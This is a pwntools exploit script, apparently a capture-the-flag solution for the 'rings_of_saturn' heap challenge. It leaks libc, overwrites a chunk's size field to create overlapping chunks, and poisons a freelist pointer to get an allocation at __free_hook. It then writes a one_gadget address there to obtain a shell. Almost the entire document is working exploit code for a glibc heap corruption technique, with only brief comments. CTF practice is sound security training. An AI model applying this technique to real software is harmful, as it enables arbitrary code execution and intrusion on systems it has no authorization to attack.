#!/usr/bin/env python3
#Write up by Ex4722
#https://github.com/ex4722/turbo-octo-pancake/tree/main/space_hero/rings_of_saturn

from pwn import *

exe = ELF("rings_of_saturn_patched")
libc = ELF("./libc.so.6", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe
context.log_level='debug'
index = 0

def conn():
    if args.REMOTE:
        io = remote("addr", 1337)
    else:
        io = process([exe.path])
        if args.DEBUG:
            gdb.attach(io)

    return io

def malloc(size):
    global index
    io.sendlineafter(b'> ', b'0')
    io.sendlineafter(b'What size', str(size)) #>=1000
    index += 1
    return index

def write(size, data):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'How much ', str(size))
    io.sendlineafter(b'> ', data)

def free(idx):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Which ', str(idx))

def print(idx):
    io.sendlineafter(b'> ', b'2')

#size > 1000
#buffer entry tra 1000 e 3000
#usa calloc

io = conn()

io.recvuntil(b'lol ')
leak = int(io.recvline(),16)
leak -= libc.symbols['exit'] + 0xc195
libc.address = leak
info("Libc Base:%#x", libc.address)

io.sendlineafter(b'> ',b'1000')
chunk1 =  malloc(1000)
chunk2 =  malloc(1000)
chunk3 =  malloc(1000)
chunk4 =  malloc(1000)  # Stop top chunk consolidatation

free(chunk3)  # Tells chunk where to end
write(992, b'A'*992 )   # Padding for the first chunk
write(8, p64(0x410 + 0x410 + 1) )  # Overwrites size field, sizeof(chunk1) *2 & 1
free(chunk1)   # in unsorted bin

giant = malloc(0x820 - 8 - 24) # get back chunk1/chunk2, sub 8 for malloc metadata, sub 24 for program metadata 

free(1)        #  This is chunk2  aka second half of giant chunk

write(1000, b'C'*1000 )  # Just padding stuff
write(1008, b'D'*1008)

#write(0x18 , p64(0x411) + p64(libc.sym.__free_hook - 0x50) + p64(0xcafebabeb))
write(0x18 , p64(0x411) + p64(libc.sym.__free_hook - 0x40) + p64(0xcafebabeb))

dummy = malloc(1000)  # This chunks fd pointer was overwritten
hook = malloc(1000)  # This is pointer to free_hook

free(giant)
free(chunk4)
free(dummy)

write(1000 + 0, b'F'*(1000 + 0))    # Can't free chunk2 so just padd it
#write(32 + 24, b'\x00'*(32 + 24))  #  Used nulls to avoid touching IO Locks before free hook
write(16 + 24, b'\x00'*(16 + 24))  #  Used nulls to avoid touching IO Locks before free hook
write(8, p64(libc.address + 0x10a45c))  # One_gadget
io.interactive()
